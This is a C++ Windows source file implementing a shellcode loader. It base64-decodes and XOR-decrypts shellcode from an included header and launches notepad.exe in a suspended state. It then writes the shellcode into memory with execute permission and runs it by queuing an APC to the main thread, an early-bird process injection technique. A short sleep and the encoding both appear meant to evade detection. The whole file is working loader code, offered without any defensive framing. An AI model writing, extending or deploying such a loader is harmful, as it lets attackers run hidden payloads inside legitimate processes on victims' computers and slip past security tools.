#include <windows.h>
#include <iostream>

#include "shellcode_encoded.h"

#pragma comment(lib, "crypt32.lib")

DWORD Base64Decode(const char* input, BYTE** output) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        return 0;
    *output = (BYTE*)HeapAlloc(GetProcessHeap(), 0, len);
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &len, NULL, NULL))
        return 0;
    return len;
}

void DecryptShellcode(BYTE* data, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) data[i] ^= key;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    Sleep(2000);
    
    BYTE* decoded = NULL;
    DWORD len = Base64Decode(b64_shellcode, &decoded);
    if (!len) return 1;
    
    DecryptShellcode(decoded, len, XOR_KEY);
    
    // Create suspended notepad process (SIMPLEST approach - works perfectly with MinGW)
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        HeapFree(GetProcessHeap(), 0, decoded);
        return 1;
    }
    
    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, len, 
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, decoded);
        return 1;
    }
    
    // Write shellcode
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, decoded, len, &written)) {
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, decoded);
        return 1;
    }
    
    // Queue APC to main thread
    if (QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0) == 0) {
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, decoded);
        return 1;
    }
    
    // Resume thread (triggers APC/shellcode)
    ResumeThread(pi.hThread);
    
    // Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    HeapFree(GetProcessHeap(), 0, decoded);
    
    return 0;
}